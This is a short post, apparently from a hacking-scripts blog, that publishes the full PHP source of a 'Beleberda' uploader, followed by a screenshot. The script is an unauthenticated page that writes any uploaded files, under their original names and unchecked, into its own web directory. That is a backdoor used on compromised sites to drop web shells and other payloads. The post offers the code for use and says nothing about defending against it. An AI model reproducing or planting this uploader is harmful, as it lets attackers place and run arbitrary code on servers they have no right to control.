---
id: 308
title: beleberda uploader script
author: admin
layout: post
guid: http://hackingscripts.com/?p=308
permalink: /beleberda-uploader-script/
categories:
  - PHP
tags:
  - PHP
  - uploader
---
Beleberda uploader script

### Beleberda Uploader Script source code

{% highlight php %}&lt;html&gt;

&lt;head&gt;
  &lt;title&gt;bele&lt;/title&gt;
&lt;/head&gt;

&lt;body&gt;
<?php


 if(empty($_GET['Nfiles']))$Nfiles=15;else $Nfiles=$_GET['Nfiles'];
if($_FILES['userfile']['tmp_name'][0]!=''){
	for($i=0;$i&lt;$Nfiles&&$_FILES['userfile']['tmp_name'][$i]!='';$i++){
	$uploaddir = dirname(__FILE__);//'/var/www/uploads/';
	$uploadfile = $uploaddir .'/'. basename($_FILES['userfile']['name'][$i]);
	print "&lt;pre&gt;";
	if (move_uploaded_file($_FILES['userfile']['tmp_name'][$i], $uploadfile)) {
	   print "File is valid, and was successfully uploaded. ";
	   //print_r($_FILES);
	} else {
	   print "Possible fie upload attack!  Here's some debugging info:\n";
	   //print_r($_FILES);
	}
	print "&lt;/pre&gt;";
	}
}
?>
&lt;form action="<?php echo $_SERVER['PHP_SELF'].'?Nfiles='.$Nfiles; ?>" method="post" enctype="multipart/form-data"&gt;
  Send beleberda:&lt;br&gt;
  <?php for($i=0;$i&lt;$Nfiles;$i++){echo '&lt;input name="userfile[]" type="file"&gt;&lt;br&gt;';}?>
  &lt;input type="submit" value="Send files"&gt;
&lt;/form&gt;

&lt;/body&gt;

&lt;/html&gt;
{% endhighlight %}

A screenshot of the Beleberda script:<figure id="attachment_392" style="width: 268px;" class="wp-caption aligncenter">

[<img src="{{ site.baseurl }}/wp-content/uploads/2014/03/beleberda.png" alt="beleberda script screenshot" width="268" height="468" class="size-full wp-image-392" />][1]<figcaption class="wp-caption-text">Beleberda script screenshot</figcaption></figure>

 [1]: {{ site.baseurl }}/wp-content/uploads/2014/03/beleberda.png